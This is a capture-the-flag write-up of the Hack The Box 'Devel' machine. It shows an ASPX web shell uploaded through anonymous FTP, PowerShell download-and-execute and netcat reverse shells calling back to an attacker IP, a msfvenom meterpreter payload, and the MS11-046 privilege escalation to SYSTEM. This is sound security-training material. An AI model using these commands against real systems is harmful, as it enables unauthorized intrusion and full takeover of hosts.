### Devel HTB

### Difficulty: Easy

### IP Address = 10.10.10.5

Nmap Scan:

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ nmap -sCV -A 10.10.10.5 -p21,80 -oN nmapscan -Pn       
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 01:57 WAT
Nmap scan report for 10.10.10.5
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.17 seconds
```

Checking ftp 

```
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:mark): anonymous 
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -al
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> cd aspnet_client
250 CWD command successful.
ftp> ls -al
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          system_web
226 Transfer complete.
ftp> cd system_web
250 CWD command successful.
ftp> ls -al
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          2_0_50727
226 Transfer complete.
ftp> cd 2_0_50727
250 CWD command successful.
ftp> ls -al
229 Entering Extended Passive Mode (|||49162|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> 
```

Looks more of a web root ftp directory

Checking for write access shows its possible 

```
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ l
nmapscan
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ echo "Testing Hacking" > write.html                                                        
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:mark): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put write.html 
local: write.html remote: write.html
229 Entering Extended Passive Mode (|||49163|)
125 Data connection already open; Transfer starting.
100% |***********************************************************|    17      197.63 KiB/s    --:-- ETA
226 Transfer complete.
17 bytes sent in 00:00 (0.03 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49164|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
01-20-23  03:00AM                   17 write.html
226 Transfer complete.
ftp> 
```

Checking the web server just shows the default windows IIS page
![image](https://user-images.githubusercontent.com/113513376/213595644-c4fc3e2f-b5d9-4d1f-a66a-0a75cc985ed0.png)

And the files in the ftp is the same as the file on the web server 

Meaning the web root directory is the ftp server directory

To confirm i'll try navigating to the file i put on the ftp server which is write.html
![image](https://user-images.githubusercontent.com/113513376/213595759-9a769047-d6b2-487c-9f55-6064a7d8e62d.png)

So now next thing to do is to get a shell via this

Since this is a windows server the executable it can run will be .aspx

To confirm i'll check wappalyzer for the web framework
![image](https://user-images.githubusercontent.com/113513376/213595888-61913ec6-965a-4c83-86fa-1f132002c83b.png)

So now lets upload a .aspx code execution file

```
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ ls /usr/share/webshells/aspx/cmdasp.aspx          
/usr/share/webshells/aspx/cmdasp.aspx
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ less cmdasp.aspx                        
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ head cmdasp.aspx 
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ 
```

So I'll put the file on the ftp server and access it via the web server

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:mark): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
pftp> put cmdasp.aspx
local: cmdasp.aspx remote: cmdasp.aspx
229 Entering Extended Passive Mode (|||49165|)
125 Data connection already open; Transfer starting.
100% |***********************************************************|  1442       27.50 MiB/s    --:-- ETA
226 Transfer complete.
1442 bytes sent in 00:00 (3.13 KiB/s)
ftp> 
```

Now accessing it through the web server
![image](https://user-images.githubusercontent.com/113513376/213596135-e0e63068-09df-43b8-814c-b506eb4941d5.png)

We can run command via this minimal shell
![image](https://user-images.githubusercontent.com/113513376/213596179-9c93c2c6-cd6d-4865-9d3f-c1df08480e1e.png)

So lets get a more stable shell

I'll be using Invoke-PowerShellTcp.ps1 script 

```                                                                                                     
┌──(mark㉿haxor)-[~/Desktop/Tools/nishang/Shells]
└─$ nano Invoke-PowerShellTcp.ps1                                           
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/Tools/nishang/Shells]
└─$ tail Invoke-PowerShellTcp.ps1
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.7 -Port 4444
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/Tools/nishang/Shells]
└─$ 
```

Starting a web server in the directory of the powershell script and also a netcat listner on port 4444

```                                                                                                       
┌──(mark㉿haxor)-[~/Desktop/Tools/nishang/Shells]
└─$ pyws -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Using this powershell command which would get the script from the remote host and directly run it without saving it on the device

```
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7/Invoke-PowerShellTcp.ps1')
```

It hangs
![image](https://user-images.githubusercontent.com/113513376/213596782-5d327269-60f6-4cee-84ca-3170a0601f18.png)

But back on python web server and listner we get a call back 
![image](https://user-images.githubusercontent.com/113513376/213596835-f27052ae-3cd2-429b-924e-5548601af1cb.png)

I'll use metasploit to navigate throught this box 

But before that I need shell access on this box from metasploit

To do that i'll create a binary which when run will give shell access

Using msfvenom to generate the binary 

```
msf6 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=4444 -f exe -o shell.exe
[*] exec: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=4444 -f exe -o shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
msf6 > 
```

So i'll set a python web server again to transfer the file (shell.exe) 

```                                                                                                      
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ l
cmdasp.aspx  nmapscan  shell.exe  write.html
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ pyws -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

On the target i'll get the remote file using certutil.exe

```
PS C:\> mkdir C:\windows\temp\haxor


    Directory: C:\windows\temp


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         20/1/2023   3:19 ??            haxor                             


PS C:\> cd c:\windows\temp\haxor
PS C:\windows\temp\haxor> certutil.exe -urlcache -f http://10.10.16.7/shell.exe shell.exe


****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\windows\temp\haxor> PS C:\windows\temp\haxor> dir


    Directory: C:\windows\temp\haxor


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         20/1/2023   3:23 ??      73802 shell.exe                         


PS C:\windows\temp\haxor> 
```

Now back on msf 

```
msf6 exploit(multi/handler) > use multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
```

Now on the target i just run the binary then i should get a callback from the msf listener

```
PS C:\windows\temp\haxor> .\shell.exe
PS C:\windows\temp\haxor> 
```

Now back on the msf listener

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.16.7:4444 -> 10.10.10.5:49170) at 2023-01-20 02:26:55 +0100

meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
```

Now searching for the OS exploit on google brings this 
![image](https://user-images.githubusercontent.com/113513376/213600984-7f9eb225-fe3a-47d1-abe2-dcd7ce30717e.png)

Lets try it out!

There's already a compiled .exe binary so i'll download it on my machine then transfer it to the target
![image](https://user-images.githubusercontent.com/113513376/213601141-6de66f58-c6fb-4c3a-9aa0-cb3db914140d.png

So now i'll upload the exploit to the target

```
meterpreter > upload /home/mark/Desktop/B2B/HTB/Devel/MS11-046.exe
[*] uploading  : /home/mark/Desktop/B2B/HTB/Devel/MS11-046.exe -> MS11-046.exe
[*] Uploaded 110.17 KiB of 110.17 KiB (100.0%): /home/mark/Desktop/B2B/HTB/Devel/MS11-046.exe -> MS11-046.exe
[*] uploaded   : /home/mark/Desktop/B2B/HTB/Devel/MS11-046.exe -> MS11-046.exe
meterpreter > 
```

Now on running it but on the powershell netcat session

```
PS C:\windows\temp\haxor> ./MS11-046.exe

c:\Windows\System32>[*] MS11-046 (CVE-2011-1249) x86 exploit
   [*] by Tomislav Paskalev
[*] Identifying OS
   [+] 32-bit
   [+] Windows 7
[*] Locating required OS components
   [+] ntkrnlpa.exe
      [*] Address:      0x82846000
      [*] Offset:       0x00910000
      [+] HalDispatchTable
         [*] Offset:    0x00a393b8
   [+] NtQueryIntervalProfile
      [*] Address:      0x77b65510
   [+] ZwDeviceIoControlFile
      [*] Address:      0x77b64ca0
[*] Setting up exploitation prerequisite
   [*] Initialising Winsock DLL
      [+] Done
      [*] Creating socket
         [+] Done
         [*] Connecting to closed port
            [+] Done
[*] Creating token stealing shellcode
   [*] Shellcode assembled
   [*] Allocating memory
      [+] Address:      0x02070000
      [*] Shellcode copied
[*] Exploiting vulnerability
   [*] Sending AFD socket connect request
      [+] Done
      [*] Elevating privileges to SYSTEM
         [+] Done
         [*] Spawning shell

[*] Exiting SYSTEM shell
PS C:\windows\temp\haxor> 
```

I think its cause of the shell isn't really stabilize thats why it doesn't want to pop a new shell

Trying it on the msf session also doesn't seems to work

Anyways it can be run remotely through an smb server 

So all i need is to create one then call the binary remotely 

On the attacker machine
```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ impacket-smbserver -smb2support share . -user admin -password admin 
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

On the target

```
PS C:\windows\temp\haxor> net use \\10.10.16.7\share /USER:admin admin
The command completed successfully.

PS C:\windows\temp\haxor> 
```

Now we can call the binary remotely 

```
PS C:\windows\temp\haxor> //10.10.16.7/share/MS11-046.exe 

c:\Windows\System32>[*] MS11-046 (CVE-2011-1249) x86 exploit
   [*] by Tomislav Paskalev
[*] Identifying OS
   [+] 32-bit
   [+] Windows 7
[*] Locating required OS components
   [+] ntkrnlpa.exe
      [*] Address:      0x82846000
      [*] Offset:       0x008b0000
      [+] HalDispatchTable
         [*] Offset:    0x009d93b8
   [+] NtQueryIntervalProfile
      [*] Address:      0x77b65510
   [+] ZwDeviceIoControlFile
      [*] Address:      0x77b64ca0
[*] Setting up exploitation prerequisite
   [*] Initialising Winsock DLL
      [+] Done
      [*] Creating socket
         [+] Done
         [*] Connecting to closed port
            [+] Done
[*] Creating token stealing shellcode
   [*] Shellcode assembled
   [*] Allocating memory
      [+] Address:      0x02070000
      [*] Shellcode copied
[*] Exploiting vulnerability
   [*] Sending AFD socket connect request
      [+] Done
      [*] Elevating privileges to SYSTEM
         [+] Done
         [*] Spawning shell

[*] Exiting SYSTEM shell
PS C:\windows\temp\haxor> whoami
iis apppool\web
PS C:\windows\temp\haxor> dir


    Directory: C:\windows\temp\haxor


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         20/1/2023   3:54 ??     112815 MS11-046.exe                      
-a---         20/1/2023   3:23 ??      73802 shell.exe                         


PS C:\windows\temp\haxor> 
```

Still doesn't work i guess its the powershell session thats causing it now let me get a cmd reverse shell using nc.exe

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ locate nc.exe    
/home/mark/Desktop/THM/Wreath/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ l            
cmdasp.aspx  MS11-046.exe  nc.exe*  nmapscan  shell.exe  write.html
```

Now calling it remotely also and specifying the binary needed to be spawned while it sends back connection to us

```

PS C:\windows\temp\haxor> //10.10.16.7/share/nc.exe 10.10.16.7 1234 -e cmd.exe

```

Now back on the listener 

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Devel]
└─$ nc -lvnp 1234                                     
listening on [any] 1234 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.5] 49181
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\windows\temp\haxor>
```

Now i'll attempt to run the binary again 

```
C:\windows\temp\haxor>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\windows\temp\haxor

20/01/2023  03:54 ��    <DIR>          .
20/01/2023  03:54 ��    <DIR>          ..
20/01/2023  03:54 ��           112.815 MS11-046.exe
20/01/2023  03:23 ��            73.802 shell.exe
               2 File(s)        186.617 bytes
               2 Dir(s)   4.697.157.632 bytes free

C:\windows\temp\haxor>MS11-046.exe
MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>
```

It worked without any issue cool

And we're done




<br> <br>
[Back To Home](../../index.md)
<br>




